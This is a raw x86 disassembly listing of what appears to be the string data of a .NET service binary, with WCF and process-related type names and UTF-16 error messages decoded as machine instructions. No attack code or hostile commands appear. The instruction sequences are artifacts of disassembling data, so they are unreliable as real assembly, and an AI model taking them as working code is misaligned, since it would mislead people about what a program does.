  4034b0:	jbe    0x40351b
  4034b2:	arpl   WORD PTR [ebp+0x48],sp
  4034b5:	outs   dx,DWORD PTR ds:[esi]
  4034b6:	jae    0x40352c
  4034b8:	inc    edx
  4034b9:	popa   
  4034ba:	jae    0x403521
  4034bc:	add    BYTE PTR [ebx+0x65],dl
  4034bf:	jb     0x403537
  4034c1:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  4034c8:	outs   dx,DWORD PTR ds:[esi]
  4034c9:	jb     0x403534
  4034cb:	jp     0x40352e
  4034cd:	je     0x403538
  4034cf:	outs   dx,DWORD PTR ds:[esi]
  4034d0:	outs   dx,BYTE PTR ds:[esi]
  4034d1:	inc    edx
  4034d2:	gs push 0x6f697661
  4034d8:	jb     0x4034da
  4034da:	addr16 gs je 0x40353d
  4034de:	inc    ecx
  4034df:	jne    0x403555
  4034e1:	push   0x7a69726f
  4034e6:	popa   
  4034e7:	je     0x403552
  4034e9:	outs   dx,DWORD PTR ds:[esi]
  4034ea:	outs   dx,BYTE PTR ds:[esi]
  4034eb:	add    BYTE PTR [ebx+0x69],dl
  4034ee:	outs   dx,BYTE PTR ds:[esi]
  4034ef:	addr16 jne 0x40355e
  4034f2:	popa   
  4034f3:	jb     0x403536
  4034f5:	jne    0x40356b
  4034f7:	push   0x7a69726f
  4034fc:	popa   
  4034fd:	je     0x403568
  4034ff:	outs   dx,DWORD PTR ds:[esi]
  403500:	outs   dx,BYTE PTR ds:[esi]
  403501:	dec    ebp
  403502:	popa   
  403503:	outs   dx,BYTE PTR ds:[esi]
  403504:	popa   
  403505:	addr16 gs jb 0x403509
  403509:	push   ebx
  40350a:	gs jb  0x403583
  40350d:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  403514:	outs   dx,DWORD PTR ds:[esi]
  403515:	jb     0x403580
  403517:	jp     0x40357a
  403519:	je     0x403584
  40351b:	outs   dx,DWORD PTR ds:[esi]
  40351c:	outs   dx,BYTE PTR ds:[esi]
  40351d:	dec    ebp
  40351e:	popa   
  40351f:	outs   dx,BYTE PTR ds:[esi]
  403520:	popa   
  403521:	addr16 gs jb 0x403525
  403525:	jae    0x40358c
  403527:	je     0x403588
  403529:	push   ebx
  40352a:	gs jb  0x4035a3
  40352d:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  403534:	outs   dx,DWORD PTR ds:[esi]
  403535:	jb     0x4035a0
  403537:	jp     0x40359a
  403539:	je     0x4035a4
  40353b:	outs   dx,DWORD PTR ds:[esi]
  40353c:	outs   dx,BYTE PTR ds:[esi]
  40353d:	dec    ebp
  40353e:	popa   
  40353f:	outs   dx,BYTE PTR ds:[esi]
  403540:	popa   
  403541:	addr16 gs jb 0x403545
  403545:	inc    ebx
  403546:	outs   dx,DWORD PTR ds:[esi]
  403547:	ins    DWORD PTR es:[edi],dx
  403548:	ins    DWORD PTR es:[edi],dx
  403549:	jne    0x4035b9
  40354b:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  403552:	dec    edi
  403553:	bound  ebp,QWORD PTR [edx+0x65]
  403556:	arpl   WORD PTR [eax+eax*1+0x4f],si
  40355a:	jo     0x4035c1
  40355c:	outs   dx,BYTE PTR ds:[esi]
  40355d:	add    BYTE PTR [ebx+0x65],dl
  403560:	jb     0x4035d8
  403562:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  403569:	gs jae 0x4035df
  40356c:	add    BYTE PTR [ebx+0x69],dl
  40356f:	outs   dx,BYTE PTR ds:[si]
  403571:	popa   
  403572:	ins    BYTE PTR es:[edi],dx
  403573:	dec    esi
  403574:	popa   
  403575:	ins    DWORD PTR es:[edi],dx
  403576:	gs fs inc ebp
  403579:	jbe    0x4035e0
  40357b:	outs   dx,BYTE PTR ds:[esi]
  40357c:	je     0x40357e
  40357e:	push   edi
  40357f:	popa   
  403580:	imul   esi,DWORD PTR [eax+eax*1+0x54],0x466b7361
  403588:	popa   
  403589:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40358d:	jns    0x40358f
  40358f:	addr16 gs je 0x4035f2
  403593:	inc    esi
  403594:	popa   
  403595:	arpl   WORD PTR [edi+ebp*2+0x72],si
  403599:	jns    0x40359b
  40359b:	push   edi
  40359c:	popa   
  40359d:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x69784572
  4035a5:	je     0x4035a7
  4035a7:	inc    ecx
  4035a8:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4035ac:	outs   dx,BYTE PTR ds:[esi]
  4035ad:	add    BYTE PTR [ebx+0x74],dl
  4035b0:	popa   
  4035b1:	jb     0x403627
  4035b3:	dec    esi
  4035b4:	gs ja  0x4035b7
  4035b7:	push   edi
  4035b8:	popa   
  4035b9:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x6c430079
  4035c1:	outs   dx,DWORD PTR ds:[esi]
  4035c2:	jae    0x403629
  4035c4:	add    BYTE PTR [ecx+0x44],cl
  4035c7:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  4035ce:	ins    BYTE PTR es:[edi],dx
  4035cf:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  4035d4:	jo     0x403645
  4035d6:	jae    0x40363d
  4035d8:	add    BYTE PTR [ebx+0x75],dl
  4035db:	jo     0x40364d
  4035dd:	outs   dx,DWORD PTR ds:[esi]
  4035de:	jb     0x403654
  4035e0:	add    BYTE PTR [ebp+0x78],al
  4035e3:	arpl   WORD PTR [ebp+0x70],sp
  4035e6:	je     0x403651
  4035e8:	outs   dx,DWORD PTR ds:[esi]
  4035e9:	outs   dx,BYTE PTR ds:[esi]
  4035ea:	add    BYTE PTR [edx+esi*2+0x61],dl
  4035ee:	arpl   WORD PTR [ebp+0x45],sp
  4035f1:	js     0x403656
  4035f3:	gs jo  0x40366a
  4035f6:	imul   ebp,DWORD PTR [edi+0x6e],0x63617453
  4035fd:	imul   eax,DWORD PTR [eax],0x53
  403600:	jns    0x403675
  403602:	je     0x403669
  403604:	ins    DWORD PTR es:[edi],dx
  403605:	cs push esp
  403607:	push   0x64616572
  40360c:	imul   ebp,DWORD PTR [esi+0x67],0x69615700
  403613:	je     0x40365d
  403615:	popa   
  403616:	outs   dx,BYTE PTR ds:[esi]
  403617:	fs ins BYTE PTR es:[edi],dx
  403619:	gs inc ebx
  40361b:	popa   
  40361c:	outs   dx,BYTE PTR ds:[esi]
  40361d:	outs   dx,BYTE PTR ds:[esi]
  40361e:	outs   dx,DWORD PTR ds:[esi]
  40361f:	je     0x403663
  403621:	gs dec edi
  403623:	jo     0x40368a
  403625:	outs   dx,BYTE PTR ds:[esi]
  403626:	gs fs inc ebp
  403629:	js     0x40368e
  40362b:	gs jo  0x4036a2
  40362e:	imul   ebp,DWORD PTR [edi+0x6e],0x64644100
  403635:	jb     0x40369c
  403637:	jae    0x4036ac
  403639:	inc    ecx
  40363a:	ins    BYTE PTR es:[edi],dx
  40363b:	jb     0x4036a2
  40363d:	popa   
  40363e:	fs jns 0x40368a
  403641:	outs   dx,BYTE PTR ds:[esi]
  403642:	push   ebp
  403643:	jae    0x4036aa
  403645:	inc    ebp
  403646:	js     0x4036ab
  403648:	gs jo  0x4036bf
  40364b:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  403652:	je     0x4036b9
  403654:	ins    DWORD PTR es:[edi],dx
  403655:	cs inc edi
  403657:	ins    BYTE PTR es:[edi],dx
  403658:	outs   dx,DWORD PTR ds:[esi]
  403659:	bound  esp,QWORD PTR [ecx+0x6c]
  40365c:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  403663:	add    BYTE PTR [ebx+0x75],al
  403666:	ins    BYTE PTR es:[edi],dx
  403667:	je     0x4036de
  403669:	jb     0x4036d0
  40366b:	dec    ecx
  40366c:	outs   dx,BYTE PTR ds:[esi]
  40366d:	outs   dx,WORD PTR ds:[esi]
  40366f:	add    BYTE PTR [edi+0x65],ah
  403672:	je     0x4036d3
  403674:	dec    ecx
  403675:	outs   dx,BYTE PTR ds:[esi]
  403676:	jbe    0x4036d9
  403678:	jb     0x4036e3
  40367a:	popa   
  40367b:	outs   dx,BYTE PTR ds:[esi]
  40367c:	je     0x4036c1
  40367e:	jne    0x4036ec
  403680:	je     0x4036f7
  403682:	jb     0x4036e9
  403684:	add    BYTE PTR [edi+ebp*2+0x53],dl
  403688:	je     0x4036fc
  40368a:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  403691:	imul   ebp,DWORD PTR [esi+0x67],0x6f464900
  403698:	jb     0x403707
  40369a:	popa   
  40369b:	je     0x4036ed
  40369d:	jb     0x40370e
  40369f:	jbe    0x40370a
  4036a1:	fs gs jb 0x4036a5
  4036a5:	inc    esi
  4036a6:	outs   dx,DWORD PTR ds:[esi]
  4036a7:	jb     0x403716
  4036a9:	popa   
  4036aa:	je     0x4036ac
  4036ac:	push   esp
  4036ad:	jb     0x403703
  4036af:	jb     0x403712
  4036b1:	arpl   WORD PTR [ebp+0x0],sp
  4036b4:	dec    ecx
  4036b5:	outs   dx,BYTE PTR ds:[esi]
  4036b6:	je     0x4036eb
  4036b8:	xor    al,BYTE PTR [eax]
  4036ba:	push   eax
  4036bb:	popa   
  4036bc:	jb     0x403731
  4036be:	add    BYTE PTR gs:[edi+0x65],al
  4036c2:	je     0x403714
  4036c4:	jb     0x403735
  4036c6:	arpl   WORD PTR [ebp+0x73],sp
  4036c9:	jae    0x40370d
  4036cb:	jns    0x403716
  4036cd:	add    BYTE PTR fs:[esi+0x75],cl
  4036d1:	ins    DWORD PTR es:[edi],dx
  4036d2:	bound  esp,QWORD PTR [ebp+0x72]
  4036d5:	inc    esi
  4036d6:	outs   dx,DWORD PTR ds:[esi]
  4036d7:	jb     0x403746
  4036d9:	popa   
  4036da:	je     0x403725
  4036dc:	outs   dx,BYTE PTR ds:[esi]
  4036dd:	outs   dx,WORD PTR ds:[esi]
  4036df:	add    BYTE PTR [edi+0x65],ah
  4036e2:	je     0x403743
  4036e4:	dec    esi
  4036e5:	jne    0x403754
  4036e7:	bound  esp,QWORD PTR [ebp+0x72]
  4036ea:	inc    esi
  4036eb:	outs   dx,DWORD PTR ds:[esi]
  4036ec:	jb     0x40375b
  4036ee:	popa   
  4036ef:	je     0x4036f1
  4036f1:	push   esp
  4036f2:	jb     0x403737
  4036f4:	outs   dx,DWORD PTR ds:[esi]
  4036f5:	outs   dx,BYTE PTR ds:[esi]
  4036f6:	je     0x40375d
  4036f8:	js     0x40376e
  4036fa:	add    BYTE PTR [edx+0x65],dl
  4036fd:	jae    0x40376e
  4036ff:	jne    0x403773
  403701:	arpl   WORD PTR [ebp+0x73],sp
  403704:	add    BYTE PTR [ebx+0x65],dh
  403707:	je     0x403768
  403709:	inc    ebx
  40370a:	jne    0x403778
  40370c:	je     0x403783
  40370e:	jb     0x403775
  403710:	add    BYTE PTR [ebx+0x65],dl
  403713:	jb     0x40378b
  403715:	imul   esp,DWORD PTR [ebx+0x65],0x736e6f43
  40371c:	je     0x40377f
  40371e:	outs   dx,BYTE PTR ds:[esi]
  40371f:	je     0x403794
  403721:	add    BYTE PTR [ebx+0x6f],al
  403724:	ins    BYTE PTR es:[edi],dx
  403725:	ins    BYTE PTR es:[edi],dx
  403726:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40372b:	outs   dx,BYTE PTR ds:[esi]
  40372c:	push   ebx
  40372d:	gs jb  0x4037a6
  403730:	imul   esp,DWORD PTR [ebx+0x65],0x4c646d43
  403737:	imul   ebp,DWORD PTR [esi+0x65],0x65646f4d
  40373e:	dec    ecx
  40373f:	add    BYTE PTR fs:[ebp+0x71],al
  403743:	jne    0x4037a6
  403745:	ins    BYTE PTR es:[edi],dx
  403746:	jae    0x403748
  403748:	push   esp
  403749:	jb     0x403790
  40374b:	jb     0x4037bf
  40374d:	outs   dx,DWORD PTR ds:[esi]
  40374e:	jb     0x403750
  403750:	arpl   WORD PTR cs:[ebx+0x74],sp
  403754:	outs   dx,DWORD PTR ds:[esi]
  403755:	jb     0x403757
  403757:	push   ebx
  403758:	gs jb  0x4037d1
  40375b:	imul   esp,DWORD PTR [ebx+0x65],0x61686542
  403762:	jbe    0x4037cd
  403764:	outs   dx,DWORD PTR ds:[esi]
  403765:	jb     0x4037a8
  403767:	je     0x4037dd
  403769:	jb     0x4037d4
  40376b:	bound  esi,QWORD PTR [ebp+0x74]
  40376e:	add    BYTE PTR gs:[ecx+eiz*2+0x73],dl
  403773:	imul   esp,DWORD PTR [eax+0x31],0x0
  403777:	addr16 gs je 0x4037da
  40377b:	push   esp
  40377c:	popa   
  40377d:	jae    0x4037ea
  40377f:	add    BYTE PTR [ebp+0x69],cl
  403782:	arpl   WORD PTR [edx+0x6f],si
  403785:	jae    0x4037f6
  403787:	data16 je 0x4037b8
  40378a:	inc    ebx
  40378b:	outs   dx,DWORD PTR ds:[esi]
  40378c:	outs   dx,BYTE PTR ds:[esi]
  40378d:	arpl   WORD PTR [ebp+0x72],si
  403790:	jb     0x4037f7
  403792:	outs   dx,BYTE PTR ds:[esi]
  403793:	arpl   WORD PTR [ecx+0x56],di
  403796:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  40379d:	gs jb  0x4037ce
  4037a0:	inc    ebx
  4037a1:	outs   dx,DWORD PTR ds:[esi]
  4037a2:	ins    BYTE PTR es:[edi],dx
  4037a3:	ins    BYTE PTR es:[edi],dx
  4037a4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4037a9:	outs   dx,BYTE PTR ds:[esi]
  4037aa:	add    BYTE PTR [edx+esi*2+0x61],dl
  4037ae:	arpl   WORD PTR [ebp+0x43],sp
  4037b1:	outs   dx,DWORD PTR ds:[esi]
  4037b2:	outs   dx,BYTE PTR ds:[esi]
  4037b3:	je     0x403827
  4037b5:	outs   dx,DWORD PTR ds:[esi]
  4037b6:	ins    BYTE PTR es:[edi],dx
  4037b7:	add    BYTE PTR [edx+esi*2+0x79],dl
  4037bb:	push   ebx
  4037bc:	gs je  0x403811
  4037bf:	gs jae 0x403837
  4037c2:	ins    BYTE PTR es:[edi],dx
  4037c3:	je     0x4037c5
  4037c5:	push   esp
  4037c6:	jb     0x40381f
  4037c8:	popa   
  4037c9:	jb     0x403839
  4037cb:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  4037d2:	pop    edi
  4037d3:	dec    ecx
  4037d4:	outs   dx,BYTE PTR ds:[esi]
  4037d5:	jae    0x40384b
  4037d7:	popa   
  4037d8:	outs   dx,BYTE PTR ds:[esi]
  4037d9:	arpl   WORD PTR [ebp+0x0],sp
  4037dc:	inc    ebx
  4037dd:	outs   dx,DWORD PTR ds:[esi]
  4037de:	ins    BYTE PTR es:[edi],dx
  4037df:	ins    BYTE PTR es:[edi],dx
  4037e0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4037e5:	outs   dx,BYTE PTR ds:[esi]
  4037e6:	inc    esi
  4037e7:	popa   
  4037e8:	jne    0x403856
  4037ea:	je     0x4037ec
  4037ec:	inc    ebx
  4037ed:	push   esi
  4037ee:	inc    ebx
  4037ef:	outs   dx,DWORD PTR ds:[esi]
  4037f0:	ins    BYTE PTR es:[edi],dx
  4037f1:	ins    BYTE PTR es:[edi],dx
  4037f2:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4037f7:	outs   dx,BYTE PTR ds:[esi]
  4037f8:	inc    ebp
  4037f9:	js     0x40385e
  4037fb:	gs jo  0x403872
  4037fe:	imul   ebp,DWORD PTR [edi+0x6e],0x6c6f4300
  403805:	ins    BYTE PTR es:[edi],dx
  403806:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40380b:	outs   dx,BYTE PTR ds:[esi]
  40380c:	inc    ebp
  40380d:	jb     0x403881
  40380f:	outs   dx,DWORD PTR ds:[esi]
  403810:	jb     0x403812
  403812:	addr16 gs je 0x403875
  403816:	inc    ebp
  403817:	jb     0x40388b
  403819:	outs   dx,DWORD PTR ds:[esi]
  40381a:	jb     0x40385f
  40381c:	outs   dx,DWORD PTR ds:[esi]
  40381d:	fs add BYTE PTR gs:[ebx+0x65],dh
  403822:	je     0x403883
  403824:	inc    ebp
  403825:	jb     0x403899
  403827:	outs   dx,DWORD PTR ds:[esi]
  403828:	jb     0x40387e
  40382a:	jns    0x40389c
  40382c:	add    BYTE PTR gs:[edi+0x65],ah
  403830:	je     0x403891
  403832:	dec    ebp
  403833:	gs jae 0x4038a9
  403836:	popa   
  403837:	add    BYTE PTR gs:[bp+di+0x65],dh
  40383c:	je     0x40389d
  40383e:	inc    ebp
  40383f:	jb     0x4038b3
  403841:	outs   dx,DWORD PTR ds:[esi]
  403842:	jb     0x403891
  403844:	gs jae 0x4038ba
  403847:	popa   
  403848:	add    BYTE PTR gs:[bp+0x61],al
  40384d:	jne    0x4038bb
  40384f:	je     0x403896
  403851:	js     0x4038b6
  403853:	gs jo  0x4038ca
  403856:	imul   ebp,DWORD PTR [edi+0x6e],0x54003160
  40385d:	jb     0x4038c0
  40385f:	arpl   WORD PTR [ebp+0x41],sp
  403862:	outs   dx,BYTE PTR ds:[esi]
  403863:	fs push esp
  403865:	push   0x776f72
  40386a:	inc    ebp
  40386b:	js     0x4038d2
  40386d:	arpl   WORD PTR [ebp+0x74],si
  403870:	imul   esi,DWORD PTR [esi+0x65],0x69676150
  403877:	outs   dx,BYTE PTR ds:[esi]
  403878:	addr16 push ebp
  40387a:	je     0x4038e5
  40387c:	ins    BYTE PTR es:[edi],dx
  40387d:	jae    0x40387f
  40387f:	dec    esi
  403880:	outs   dx,BYTE PTR gs:[si]
  403883:	dec    eax
  403884:	gs ins BYTE PTR es:[edi],dx
  403886:	jo     0x4038ed
  403888:	jb     0x40388a
  40388a:	push   eax
  40388b:	jb     0x4038fc
  40388d:	arpl   WORD PTR [ebp+0x73],sp
  403890:	jae    0x4038df
  403892:	outs   dx,DWORD PTR ds:[esi]
  403893:	fs jne 0x403902
  403896:	add    BYTE PTR gs:[edi+0x65],ah
  40389a:	je     0x4038fb
  40389c:	dec    ebp
  40389d:	popa   
  40389e:	imul   ebp,DWORD PTR [esi+0x4d],0x6c75646f
  4038a5:	add    BYTE PTR gs:[edi+0x65],ah
  4038a9:	je     0x40390a
  4038ab:	inc    esi
  4038ac:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  4038b4:	inc    ebx
  4038b5:	outs   dx,DWORD PTR ds:[esi]
  4038b6:	outs   dx,BYTE PTR ds:[esi]
  4038b7:	arpl   WORD PTR [ecx+0x74],sp
  4038ba:	add    BYTE PTR [eax],al
  4038bc:	add    BYTE PTR [ecx],al
  4038be:	add    BYTE PTR [ecx+0x41],ah
  4038c1:	add    BYTE PTR [esi+0x0],ch
  4038c4:	and    BYTE PTR [eax],al
  4038c6:	add    BYTE PTR gs:[edx+0x0],dh
  4038ca:	jb     0x4038cc
  4038cc:	outs   dx,DWORD PTR ds:[esi]
  4038cd:	add    BYTE PTR [edx+0x0],dh
  4038d0:	and    BYTE PTR [eax],al
  4038d2:	outs   dx,DWORD PTR ds:[esi]
  4038d3:	add    BYTE PTR [ebx+0x0],ah
  4038d6:	arpl   WORD PTR [eax],ax
  4038d8:	jne    0x4038da
  4038da:	jb     0x4038dc
  4038dc:	jb     0x4038de
  4038de:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4038e3:	add    BYTE PTR [edi+0x0],dh
  4038e6:	push   0x6c006900
  4038eb:	add    BYTE PTR [ebp+0x0],ah
  4038ee:	and    BYTE PTR [eax],al
  4038f0:	jb     0x4038f2
  4038f2:	jne    0x4038f4
  4038f4:	outs   dx,BYTE PTR ds:[esi]
  4038f5:	add    BYTE PTR [esi+0x0],ch
  4038f8:	imul   eax,DWORD PTR [eax],0x67006e
  4038fe:	and    BYTE PTR [eax],al
  403900:	je     0x403902
  403902:	push   0x20006500
  403907:	add    BYTE PTR [ecx+0x0],ah
  40390a:	jo     0x40390c
  40390c:	jo     0x40390e
  40390e:	ins    BYTE PTR es:[edi],dx
  40390f:	add    BYTE PTR [ecx+0x0],ch
  403912:	arpl   WORD PTR [eax],ax
  403914:	popa   
  403915:	add    BYTE PTR [eax+eax*1+0x69],dh
  403919:	add    BYTE PTR [edi+0x0],ch
  40391c:	outs   dx,BYTE PTR ds:[esi]
  40391d:	add    BYTE PTR [esi],ch
  40391f:	add    BYTE PTR [eax],al
  403921:	or     eax,0x30007b
  403926:	jge    0x403928
  403928:	jnp    0x40392a
  40392a:	xor    DWORD PTR [eax],eax
  40392c:	jge    0x40392e
  40392e:	add    BYTE PTR [ecx+0x6e],bh
  403931:	add    BYTE PTR [ebp+0x0],ah
  403934:	je     0x403936
  403936:	add    BYTE PTR cs:[eax+0x0],dh
  40393a:	imul   eax,DWORD PTR [eax],0x650070
  403940:	cmp    al,BYTE PTR [eax]
  403942:	das    
  403943:	add    BYTE PTR [edi],ch
  403945:	add    BYTE PTR [eax+eax*1+0x6f],ch
  403949:	add    BYTE PTR [ebx+0x0],ah
  40394c:	popa   
  40394d:	add    BYTE PTR [eax+eax*1+0x68],ch
  403951:	add    BYTE PTR [edi+0x0],ch
  403954:	jae    0x403956
  403956:	je     0x403958
  403958:	das    
  403959:	add    BYTE PTR [ebx+0x0],al
  40395c:	outs   dx,DWORD PTR ds:[esi]
  40395d:	add    BYTE PTR [esi+0x0],ch
  403960:	arpl   WORD PTR [eax],ax
  403962:	jne    0x403964
  403964:	jb     0x403966
  403966:	jb     0x403968
  403968:	add    BYTE PTR gs:[esi+0x0],ch
  40396c:	arpl   WORD PTR [eax],ax
  40396e:	jns    0x403970
  403970:	push   esi
  403971:	add    BYTE PTR [ecx+0x0],ch
  403974:	jae    0x403976
  403976:	jne    0x403978
  403978:	popa   
  403979:	add    BYTE PTR [eax+eax*1+0x69],ch
  40397d:	add    BYTE PTR [edx+0x0],bh
  403980:	add    BYTE PTR gs:[edx+0x0],dh
  403984:	das    
  403985:	add    BYTE PTR [ebx+0x0],al
  403988:	outs   dx,DWORD PTR ds:[esi]
  403989:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40398d:	add    BYTE PTR [ebp+0x0],ah
  403990:	arpl   WORD PTR [eax],ax
  403992:	je     0x403994
  403994:	imul   eax,DWORD PTR [eax],0x6e006f
  40399a:	push   ebx
  40399b:	add    BYTE PTR [ebp+0x0],ah
  40399e:	jb     0x4039a0
  4039a0:	jbe    0x4039a2
  4039a2:	imul   eax,DWORD PTR [eax],0x650063
  4039a8:	add    BYTE PTR [ebx],al
  4039aa:	dec    esi
  4039ab:	add    BYTE PTR [eax],al
  4039ad:	and    edx,DWORD PTR [ebx+0x0]
  4039b0:	add    BYTE PTR gs:[edx+0x0],dh
  4039b4:	jbe    0x4039b6
  4039b6:	imul   eax,DWORD PTR [eax],0x650063
  4039bc:	and    BYTE PTR [eax],al
  4039be:	push   ebp
  4039bf:	add    BYTE PTR [edx+0x0],dh
  4039c2:	imul   eax,DWORD PTR [eax],0x270020
  4039c8:	jnp    0x4039ca
  4039ca:	xor    BYTE PTR [eax],al
  4039cc:	jge    0x4039ce
  4039ce:	daa    
  4039cf:	add    BYTE PTR [ecx],al
  4039d1:	xor    DWORD PTR [ebx+0x0],edx
  4039d4:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  4039d9:	add    BYTE PTR [ecx+0x0],ch
  4039dc:	outs   dx,BYTE PTR ds:[esi]
  4039dd:	add    BYTE PTR [edi+0x0],ah
  4039e0:	and    BYTE PTR [eax],al
  4039e2:	arpl   WORD PTR [eax],ax
  4039e4:	jne    0x4039e6
  4039e6:	ins    BYTE PTR es:[edi],dx
  4039e7:	add    BYTE PTR [eax+eax*1+0x75],dh
  4039eb:	add    BYTE PTR [edx+0x0],dh
  4039ee:	add    BYTE PTR gs:[eax],ah
  4039f1:	add    BYTE PTR [eax+eax*1+0x43],cl
  4039f5:	add    BYTE PTR [ecx+0x0],cl
  4039f8:	inc    esp
  4039f9:	add    BYTE PTR ds:0x30007b00,bh
  4039ff:	add    BYTE PTR [ebp+0x0],bh
  403a02:	add    BYTE PTR [ebx],dh
  403a04:	push   ebp
  403a05:	add    BYTE PTR [esi+0x0],ch
  403a08:	popa   
  403a09:	add    BYTE PTR [edx+0x0],ah
  403a0c:	ins    BYTE PTR es:[edi],dx
  403a0d:	add    BYTE PTR [ebp+0x0],ah
  403a10:	and    BYTE PTR [eax],al
  403a12:	je     0x403a14
  403a14:	outs   dx,DWORD PTR ds:[esi]
  403a15:	add    BYTE PTR [eax],ah
  403a17:	add    BYTE PTR [eax+0x0],dh
  403a1a:	popa   
  403a1b:	add    BYTE PTR [edx+0x0],dh
  403a1e:	jae    0x403a20
  403a20:	add    BYTE PTR gs:[eax],ah
  403a23:	add    BYTE PTR [ecx+0x0],ah
  403a26:	jb     0x403a28
  403a28:	add    BYTE PTR [di+0x0],dh
  403a2c:	ins    DWORD PTR es:[edi],dx
  403a2d:	add    BYTE PTR [ebp+0x0],ah
  403a30:	outs   dx,BYTE PTR ds:[esi]
  403a31:	add    BYTE PTR [eax+eax*1+0x73],dh
  403a35:	add    BYTE PTR [eax],al
  403a37:	jne    0x403a82
  403a39:	add    BYTE PTR [esi+0x0],ch
  403a3c:	jbe    0x403a3e
  403a3e:	popa   
  403a3f:	add    BYTE PTR [eax+eax*1+0x69],ch
  403a43:	add    BYTE PTR [eax+eax*1+0x20],ah
  403a47:	add    BYTE PTR [esi+0x0],ch
  403a4a:	jne    0x403a4c
  403a4c:	ins    DWORD PTR es:[edi],dx
  403a4d:	add    BYTE PTR [edx+0x0],ah
  403a50:	add    BYTE PTR gs:[edx+0x0],dh
  403a54:	and    BYTE PTR [eax],al
  403a56:	outs   dx,DWORD PTR ds:[esi]
  403a57:	add    BYTE PTR [esi+0x0],ah
  403a5a:	and    BYTE PTR [eax],al
  403a5c:	popa   
  403a5d:	add    BYTE PTR [edx+0x0],dh
  403a60:	add    BYTE PTR [di+0x0],dh
  403a64:	ins    DWORD PTR es:[edi],dx
  403a65:	add    BYTE PTR [ebp+0x0],ah
  403a68:	outs   dx,BYTE PTR ds:[esi]
  403a69:	add    BYTE PTR [eax+eax*1+0x73],dh
  403a6d:	add    BYTE PTR [eax],ah
  403a6f:	add    BYTE PTR [eax+eax*1+0x6f],dh
  403a73:	add    BYTE PTR [eax],ah
  403a75:	add    BYTE PTR [ebx+0x0],ah
  403a78:	outs   dx,DWORD PTR ds:[esi]
  403a79:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403a7d:	add    BYTE PTR [ebp+0x0],ah
  403a80:	arpl   WORD PTR [eax],ax
  403a82:	je     0x403a84
  403a84:	imul   eax,DWORD PTR [eax],0x6e006f
  403a8a:	and    BYTE PTR [eax],al
  403a8c:	jae    0x403a8e
  403a8e:	add    BYTE PTR gs:[edx+0x0],dh
  403a92:	jbe    0x403a94
  403a94:	imul   eax,DWORD PTR [eax],0x650063
  403a9a:	and    BYTE PTR [eax],al
  403a9c:	jo     0x403a9e
  403a9e:	jb     0x403aa0
  403aa0:	outs   dx,DWORD PTR ds:[esi]
  403aa1:	add    BYTE PTR [ebx+0x0],ah
  403aa4:	add    BYTE PTR gs:[ebx+0x0],dh
  403aa8:	jae    0x403aaa
  403aaa:	add    BYTE PTR cs:[eax],al
  403aad:	outs   dx,DWORD PTR ds:[esi]
  403aae:	push   ebp
  403aaf:	add    BYTE PTR [esi+0x0],ch
  403ab2:	popa   
  403ab3:	add    BYTE PTR [edx+0x0],ah
  403ab6:	ins    BYTE PTR es:[edi],dx
  403ab7:	add    BYTE PTR [ebp+0x0],ah
  403aba:	and    BYTE PTR [eax],al
  403abc:	je     0x403abe
  403abe:	outs   dx,DWORD PTR ds:[esi]
  403abf:	add    BYTE PTR [eax],ah
  403ac1:	add    BYTE PTR [ebx+0x0],dh
  403ac4:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  403ac9:	add    BYTE PTR [eax+eax*1+0x61],dl
  403acd:	add    BYTE PTR [ebx+0x0],dh
  403ad0:	imul   eax,DWORD PTR [eax],0x43
  403ad3:	add    BYTE PTR [edi+0x0],ch
  403ad6:	ins    DWORD PTR es:[edi],dx
  403ad7:	add    BYTE PTR [eax+0x0],dh
  403ada:	ins    BYTE PTR es:[edi],dx
  403adb:	add    BYTE PTR [ebp+0x0],ah
  403ade:	je     0x403ae0
  403ae0:	imul   eax,DWORD PTR [eax],0x6e006f
  403ae6:	push   ebx
  403ae7:	add    BYTE PTR [edi+0x0],ch
  403aea:	jne    0x403aec
  403aec:	jb     0x403aee
  403aee:	arpl   WORD PTR [eax],ax
  403af0:	add    BYTE PTR gs:[eax],ah
  403af3:	add    BYTE PTR [esi+0x0],ah
  403af6:	outs   dx,DWORD PTR ds:[esi]
  403af7:	add    BYTE PTR [edx+0x0],dh
  403afa:	and    BYTE PTR [eax],al
  403afc:	jae    0x403afe
  403afe:	add    BYTE PTR gs:[edx+0x0],dh
  403b02:	jbe    0x403b04
  403b04:	imul   eax,DWORD PTR [eax],0x650063
  403b0a:	and    BYTE PTR [eax],al
  403b0c:	jae    0x403b0e
  403b0e:	push   0x74007500
  403b13:	add    BYTE PTR [eax+eax*1+0x6f],ah
  403b17:	add    BYTE PTR [edi+0x0],dh
  403b1a:	outs   dx,BYTE PTR ds:[esi]
  403b1b:	add    BYTE PTR [eax],al
  403b1d:	pop    ecx
  403b1e:	push   ebx
  403b1f:	add    BYTE PTR [ebx+0x0],al
  403b22:	outs   dx,DWORD PTR ds:[esi]
  403b23:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403b27:	add    BYTE PTR [ebp+0x0],ah
  403b2a:	arpl   WORD PTR [eax],ax
  403b2c:	je     0x403b2e
